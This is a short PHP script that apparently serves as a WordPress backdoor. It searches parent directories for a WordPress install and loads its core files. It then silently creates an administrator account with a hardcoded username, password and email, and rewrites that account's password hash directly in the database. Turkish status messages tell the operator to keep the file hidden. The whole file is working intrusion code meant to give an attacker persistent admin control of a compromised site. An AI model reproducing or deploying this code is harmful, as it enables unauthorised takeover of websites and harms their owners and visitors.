<?php
function get_file_name()
{
	if (file_exists(__FILE__)) {
		return __FILE__;
	}
	preg_match_all('/(.+?)(?=\(\d+\)\s*:\s*)/', __FILE__, $m, PREG_PATTERN_ORDER);
	if (isset($m[1]) && isset($m[1][0])) {
		return $m[1][0];
	}
}
$dir = get_file_name();
for ($i = 1; $i <= 8; $i++) {
	$dir = rtrim(dirname($dir), DIRECTORY_SEPARATOR);
	$f1 = $dir . DIRECTORY_SEPARATOR . "wp-blog-header.php";
	$f2 = $dir . DIRECTORY_SEPARATOR . "wp-includes/registration.php";
	if (file_exists($f1) && file_exists($f2)) {
		echo "Buldu " . $i;
		require_once($f1);
		require_once($f2);
		break;
	}
}
$ad = 'administrator';
$a = 'demilation';
$b = 'f00b@r!!a';
$c = 'coderbruh@protonmail.com';

if (!username_exists($a) && !email_exists($newemail)) {
	$user_id = wp_create_user($a, $b, $c);
	if (is_int($user_id)) {
		$wp_user_object = new WP_User($user_id);
		$wp_user_object->set_role($ad);
		@$wpdb->query("Update `$wpdb->users` Set user_pass = '8dcd4bd55e3aae41c580b5b5bc48bf29' Where user_login = '" . $a . "'");
		echo 'Admin basarili oldu. nazim unutma bu.php gizli yerde olsun!';
	} else {
		echo 'hata 1.';
	}
} else {
	echo 'bu kullanıcı var kontrol et.';
}
?>